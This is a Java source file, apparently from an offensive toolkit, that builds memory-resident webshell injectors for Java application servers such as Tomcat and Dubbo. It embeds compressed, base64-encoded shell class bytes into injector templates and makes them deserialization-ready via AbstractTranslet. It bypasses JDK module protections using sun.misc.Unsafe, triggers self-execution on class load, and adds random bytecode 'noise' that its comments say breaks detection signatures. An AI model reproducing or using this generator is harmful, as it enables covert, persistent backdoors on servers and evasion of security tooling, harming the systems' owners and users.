package org.leo.jmg.mem.injectortpl;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import javassist.CtNewMethod;
import org.leo.core.infrastructure.bytecode.asm.ClassFileMinimizer;
import org.leo.core.util.request.ClassNameGenerator;
import org.leo.core.util.request.GenerationRandom;
import org.leo.jmg.ServletNamespace;
import org.leo.jmg.generation.GenerationPlan;
import org.leo.jmg.generation.GenerationRequest;
import org.leo.jmg.generation.GenerationWorkspace;
import org.leo.jmg.mem.helper.tomcat.TomcatWsBypassValve;
import org.leo.jmg.util.base64.Base64Utils;
import org.leo.jmg.util.javassist.JavassistUtil;

import java.io.InputStream;
import java.util.HashSet;
import java.util.Random;
import java.util.Set;

public class InjectorGenerator {

    public byte[] makeInjector(GenerationPlan plan,
                               GenerationWorkspace workspace) throws Exception {
        GenerationRequest request = plan.getRequest();
        return makeInjector(new InjectorTemplateContext(
                workspace.getInjectorClassName(),
                plan.isAbstractTranslet(),
                workspace.getShellClassName(),
                workspace.getShellClassBytes(),
                createHelperClass(plan, workspace),
                workspace.getEffectiveUrlPattern() == null
                        ? request.getUrlPattern() : workspace.getEffectiveUrlPattern(),
                request.getHeaderName(),
                request.getHeaderValue(),
                request.getEffectiveServletNamespace(),
                request.isBypassJavaModuleEffective(),
                request.isStaticInitialize(),
                request.isShrink()),
                plan.getInjectorDescriptor().getInjectorTemplateName());
    }

    private byte[] makeInjector(InjectorTemplateContext context,
                                String injectorTplName) throws Exception {
        // 从模板类字节码克隆新类，避免直接修改模板本身
        String classPath = "/" + injectorTplName.replace('.', '/') + ".class";

        // 完全独立的池（parent=null），避免模板类被 getDefault() 父池缓存后 makeClass() 抛出
        // "is in a parent ClassPool" 错误；不能用 Class.forName 加载模板类，否则同样会污染父池
        ClassPool pool = new ClassPool(null);
        pool.appendSystemPath();
        pool.insertClassPath(new ClassClassPath(InjectorGenerator.class));

        CtClass ctClass;
        try (InputStream is = InjectorGenerator.class.getResourceAsStream(classPath)) {
            if (is == null) {
                throw new RuntimeException("Cannot find injector template class bytes for " + injectorTplName);
            }
            ctClass = pool.makeClass(is);
        }

        // 改名为目标注入器类名
        ctClass.setName(context.injectorClassName);
        // 统一降到 Java 5，兼容更多目标环境
        ctClass.getClassFile().setVersionToJava5();

        if (context.abstractTranslet) {
            ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        }

        // 部分注入器通过 getter 暴露三个生成占位符。保持模板原貌，
        // 仅在生成阶段把返回值改写为本次构建的数据。
        if (!replaceStringGetterIfDeclared(ctClass, "getClassName",
                context.shellClassName)) {
            JavassistUtil.replaceStaticField(ctClass, "shellClassName",
                    "private static String shellClassName = \""
                            + JavassistUtil.escapeJavaString(context.shellClassName) + "\";");
        }
        if (!replaceStringGetterIfDeclared(ctClass, "getBase64String",
                Base64Utils.gzipAndBase64(context.shellClassBytes))) {
            JavassistUtil.replaceStaticField(ctClass, "shellClass",
                    "private static String shellClass = \""
                            + JavassistUtil.escapeJavaString(
                            Base64Utils.gzipAndBase64(context.shellClassBytes)) + "\";");
        }
        if (!replaceStringGetterIfDeclared(ctClass, "getUrlPattern", context.urlPattern)) {
            JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "urlPattern",
                    "private static String urlPattern = \""
                            + JavassistUtil.escapeJavaString(context.urlPattern) + "\";");
        }
        if (context.helperClassBytes != null) {
            replaceStringGetterIfDeclared(ctClass, "getHelperBase64String",
                    Base64Utils.gzipAndBase64(context.helperClassBytes));
        }
        JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "headerName",
                "private static String headerName = \""
                        + JavassistUtil.escapeJavaString(context.headerName) + "\";");
        JavassistUtil.replaceStaticFieldIfDeclared(ctClass, "headerValue",
                "private static String headerValue = \""
                        + JavassistUtil.escapeJavaString(context.headerValue) + "\";");

        JavassistUtil.applyServletNamespace(ctClass, context.servletNamespace);

        if (context.bypassJavaModule) {
            injectJavaModuleBypass(ctClass);
        }

        if (context.staticInitialize) {
            injectStaticSelfInitialization(ctClass);
        }

        // 注入字节码噪声，增加注入器类字节码多样性，打破固定结构特征。
        injectBytecodeNoise(ctClass);

        try {
            byte[] bytes = ctClass.toBytecode();
            return context.shrink
                    ? ClassFileMinimizer.transform(bytes)
                    : bytes;
        } finally {
            ctClass.detach();
        }
    }

    private byte[] createHelperClass(GenerationPlan plan,
                                     GenerationWorkspace workspace) throws Exception {
        GenerationRequest request = plan.getRequest();
        if (request.getInjectorName().endsWith("DubboServiceInjector")) {
            return createDubboServiceInterface(workspace, request.isShrink());
        }
        if (!"Tomcat".equalsIgnoreCase(request.getServerType())
                || !"ByPassNginxWebSocketInjector".equals(request.getInjectorName())) {
            return null;
        }
        String helperName = workspace.getShellClassName() + "$1";
        String resource = "/" + TomcatWsBypassValve.class.getName()
                .replace('.', '/') + ".class";
        ClassPool pool = new ClassPool(null);
        pool.appendSystemPath();
        pool.insertClassPath(new ClassClassPath(TomcatWsBypassValve.class));
        try (InputStream input = TomcatWsBypassValve.class.getResourceAsStream(resource)) {
            if (input == null) {
                throw new IllegalStateException("Cannot find WebSocket bypass helper template");
            }
            CtClass helper = pool.makeClass(input);
            try {
                helper.setName(helperName);
                helper.getClassFile().setVersionToJava5();
                JavassistUtil.replaceStaticField(helper, "headerName",
                        "public static String headerName = \""
                                + JavassistUtil.escapeJavaString(request.getHeaderName()) + "\";");
                JavassistUtil.replaceStaticField(helper, "headerValue",
                        "public static String headerValue = \""
                                + JavassistUtil.escapeJavaString(request.getHeaderValue()) + "\";");
                JavassistUtil.applyServletNamespace(helper,
                        request.getEffectiveServletNamespace());
                byte[] bytes = helper.toBytecode();
                return request.isShrink()
                        ? ClassFileMinimizer.transform(bytes) : bytes;
            } finally {
                helper.detach();
            }
        }
    }

    private byte[] createDubboServiceInterface(GenerationWorkspace workspace,
                                                boolean shrink) throws Exception {
        String shellName = workspace.getShellClassName();
        int packageEnd = shellName.lastIndexOf('.');
        String packageName = packageEnd < 0 ? "" : shellName.substring(0, packageEnd + 1);
        String simpleName = packageEnd < 0 ? shellName : shellName.substring(packageEnd + 1);
        ClassPool pool = new ClassPool(null);
        pool.appendSystemPath();
        CtClass helper = pool.makeInterface(packageName + "I" + simpleName);
        try {
            helper.getClassFile().setVersionToJava5();
            helper.addMethod(CtNewMethod.abstractMethod(
                    pool.get("byte[]"), "handle", new CtClass[]{pool.get("byte[]")},
                    new CtClass[0], helper));
            byte[] bytes = helper.toBytecode();
            return shrink ? ClassFileMinimizer.transform(bytes) : bytes;
        } finally {
            helper.detach();
        }
    }

    private void replaceStringGetter(CtClass ctClass,
                                     String methodName,
                                     String value) throws Exception {
        CtMethod method = ctClass.getDeclaredMethod(methodName);
        method.setBody("{ return \"" + JavassistUtil.escapeJavaString(value) + "\"; }");
    }

    private boolean replaceStringGetterIfDeclared(CtClass ctClass,
                                                  String methodName,
                                                  String value) throws Exception {
        try {
            replaceStringGetter(ctClass, methodName, value);
            return true;
        } catch (javassist.NotFoundException ignored) {
            // Listener、Valve、Interceptor 等全局挂载点没有 URL 参数。
            return false;
        }
    }

    /**
     * 将 Injector 所属 Module 调整到 java.base 的开放模块，使 JDK 9+ 上的
     * 反射式 ClassLoader#defineClass 与容器私有字段访问可在强封装运行时继续执行。
     */
    private void injectJavaModuleBypass(CtClass ctClass) throws Exception {
        final String methodName = "bypassJavaModule";
        CtMethod method = CtNewMethod.make(
                "private static void " + methodName + "(Class target){"
                        + "try{"
                        + "Class uc=Class.forName(\"sun.misc.Unsafe\");"
                        + "java.lang.reflect.Field uf=uc.getDeclaredField(\"theUnsafe\");"
                        + "uf.setAccessible(true);"
                        + "Object u=uf.get(null);"
                        + "Object m=Class.class.getMethod(\"getModule\",new Class[0])"
                        + ".invoke(Object.class,new Object[0]);"
                        + "java.lang.reflect.Method of=u.getClass().getMethod("
                        + "\"objectFieldOffset\",new Class[]{java.lang.reflect.Field.class});"
                        + "Long o=(Long)of.invoke(u,new Object[]{Class.class.getDeclaredField(\"module\")});"
                        + "java.lang.reflect.Method gs=u.getClass().getMethod("
                        + "\"getAndSetObject\",new Class[]{Object.class,Long.TYPE,Object.class});"
                        + "gs.invoke(u,new Object[]{target,o,m});"
                        + "}catch(Throwable ignored){}"
                        + "}",
                ctClass);
        ctClass.addMethod(method);
        String call = methodName + "(" + ctClass.getName() + ".class);";
        for (CtConstructor constructor : ctClass.getDeclaredConstructors()) {
            constructor.insertBeforeBody(call);
        }
    }

    /** 在类初始化完成前自动执行一次 Injector 无参构造器。 */
    private void injectStaticSelfInitialization(CtClass ctClass) throws Exception {
        CtConstructor initializer = ctClass.getClassInitializer();
        if (initializer == null) {
            initializer = ctClass.makeClassInitializer();
        }
        initializer.insertAfter("new " + ctClass.getName() + "();");
    }

    /**
     * 注入字节码噪声，增加注入器类字节码多样性。
     * <p>
     * 添加随机命名的私有方法（无副作用：局部变量 + 常量运算），并在父类构造完成后调用，
     * 打破"固定字段 + 固定方法"的注入器结构特征。噪声方法被构造函数引用，
     * 不会被 {@link ClassFileMinimizer} 移除。
     * <p>
     * 不改变 inject() 反射注册逻辑（顺序受语义约束），仅增加字节码随机性。
     */
    private void injectBytecodeNoise(CtClass ctClass) throws Exception {
        Random random = GenerationRandom.current();
        Set<String> used = new HashSet<String>();

        int methodCount = 1 + random.nextInt(2);
        StringBuilder constructorCalls = new StringBuilder();
        for (int i = 0; i < methodCount; i++) {
            String methodName = ClassNameGenerator.randomMethodName(used);
            String varName = ClassNameGenerator.randomFieldName(used);
            int value = random.nextInt(65536);
            int mask = random.nextInt(256);
            String body = "{ long " + varName + " = " + value + "L; "
                    + varName + " = " + varName + " ^ " + mask + "L; }";
            try {
                CtMethod noiseMethod = CtNewMethod.make(
                        "private void " + methodName + "()" + body, ctClass);
                ctClass.addMethod(noiseMethod);
                if (constructorCalls.length() > 0) constructorCalls.append(' ');
                constructorCalls.append(methodName).append("();");
            } catch (Exception ignored) {
                // 单个噪声方法构造失败不影响主流程
            }
        }

        // 必须插入到显式 super()/this() 调用之后。insertBefore() 会在父类构造前
        // 调用实例方法，此时 this 仍是未初始化对象，会触发构造器 VerifyError。
        if (constructorCalls.length() > 0) {
            for (CtConstructor constructor : ctClass.getDeclaredConstructors()) {
                try {
                    constructor.insertBeforeBody(constructorCalls.toString());
                } catch (Exception ignored) {
                    // 某些构造函数可能无法插入，跳过
                }
            }
        }
    }

    private static final class InjectorTemplateContext {
        private final String injectorClassName;
        private final boolean abstractTranslet;
        private final String shellClassName;
        private final byte[] shellClassBytes;
        private final byte[] helperClassBytes;
        private final String urlPattern;
        private final String headerName;
        private final String headerValue;
        private final ServletNamespace servletNamespace;
        private final boolean bypassJavaModule;
        private final boolean staticInitialize;
        private final boolean shrink;

        private InjectorTemplateContext(String injectorClassName,
                                        boolean abstractTranslet,
                                        String shellClassName,
                                        byte[] shellClassBytes,
                                        byte[] helperClassBytes,
                                        String urlPattern,
                                        String headerName,
                                        String headerValue,
                                        ServletNamespace servletNamespace,
                                        boolean bypassJavaModule,
                                        boolean staticInitialize,
                                        boolean shrink) {
            this.injectorClassName = injectorClassName;
            this.abstractTranslet = abstractTranslet;
            this.shellClassName = shellClassName;
            this.shellClassBytes = shellClassBytes;
            this.helperClassBytes = helperClassBytes;
            this.urlPattern = urlPattern;
            this.headerName = headerName;
            this.headerValue = headerValue;
            this.servletNamespace = servletNamespace;
            this.bypassJavaModule = bypassJavaModule;
            this.staticInitialize = staticInitialize;
            this.shrink = shrink;
        }
    }
}
